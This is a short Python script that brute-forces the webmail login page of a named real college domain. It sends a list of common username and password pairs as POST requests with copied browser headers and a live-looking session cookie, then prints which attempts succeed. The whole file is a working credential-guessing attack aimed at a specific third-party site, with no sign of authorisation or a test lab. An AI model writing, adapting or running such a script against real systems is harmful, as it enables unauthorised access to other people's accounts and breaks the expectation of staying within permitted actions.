#divide into functions- 1) one which is making the username and passwords for each field
#2) one who is sending as a request to the form/login page /brute forcing the page
import requests

def bf_tool(dictCredentials, url):
    # Get and print the public IP address
    response = requests.get("https://api.ipify.org?format=json")
    ip = response.json().get('ip')
    print(f"SENDING REQUEST FROM IP - {ip}")
    
    # Iterate over the credentials and call bf_website for each
    for uname, pwd in dictCredentials.items():
        print(f'TRYING {uname} - {pwd}')
        bf_website(uname, pwd, url)

def bf_website(uname, pwd, url):
    # Construct the data string
    data = f"user={uname}&pass={pwd}&goto_uri=%2F"
    
    # Define the headers
    headers = {
        'Host': 'casetcollege.in:2096',
        'Cookie': '_ga_TX2RZL1Z2H=GS1.1.1738433752.4.1.1738434126.0.0.0; _ga=GA1.1.92810325.1737276433; roundcube_cookies=enabled; webmailsession=%3aHLTN17USbq1QlzcE%2c3ba19168dc3dfb7f08b601507692c9c8; timezone=Asia/Kolkata',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': str(len(data)),
        'Origin': 'https://casetcollege.in:2096',
        'Referer': 'https://casetcollege.in:2096/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Priority': 'u=0',
        'Te': 'trailers',
        'Connection': 'keep-alive'
    }
    
    # Send the POST request
    try:
        response = requests.post(url=url, data=data, headers=headers, timeout=10)
        if response.status_code == 200:
            print(f"SUCCESS")
            print(response.content)
        else:
            print(f"FAILED for uname -> {uname}, passwd -> {pwd}. Status Code: {response.status_code}")
    except requests.RequestException as e:
        print(f"ERROR: Could not connect to {url}. Reason: {e}")

if __name__ == "__main__":
    # Define the dictionary of credentials
    dictCredentials = {
        "user1": "password123",
        "user2": "qwerty456",
        "user3": "letmein789",
        "user4": "admin2025",
        "user5": "welcome321",
        "user6": "passw0rd",
        "user7": "12345678",
        "user8": "abc12345",
        "user9": "password1",
        "user10": "mypassword"
    }
    
    # Define the URL
    url = "https://casetcollege.in:2096/login/?login_only=1"
    
    # Call the bf_tool function
    bf_tool(dictCredentials, url)